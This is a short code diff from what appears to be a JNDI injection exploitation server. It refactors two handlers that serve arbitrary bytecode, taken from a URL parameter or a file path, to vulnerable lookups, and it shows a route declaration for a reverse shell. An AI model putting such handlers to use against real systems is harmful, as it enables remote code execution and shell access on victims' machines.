@@ -79,15 +79,13 @@ public class BasicController implements Controller {
     @JNDIMapping("/FromUrl/{data}")
     public byte[] fromUrl(String data) {
         System.out.println("[FromUrl] Load custom bytecode data from url");
-        byte[] byteCode = Base64.getUrlDecoder().decode(data);
-        return byteCode;
+        return Base64.getUrlDecoder().decode(data);
     }
 
     @JNDIMapping("/FromFile/{path}")
     public byte[] fromFile(String path) throws Exception {
         System.out.println("[FromFile] Load custom bytecode data from file: " + path);
-        byte[] byteCode = Files.readAllBytes(Paths.get(path));
-        return byteCode;
+        return Files.readAllBytes(Paths.get(path));
     }
 
     @JNDIMapping("/ReverseShell/{host}/{port}")
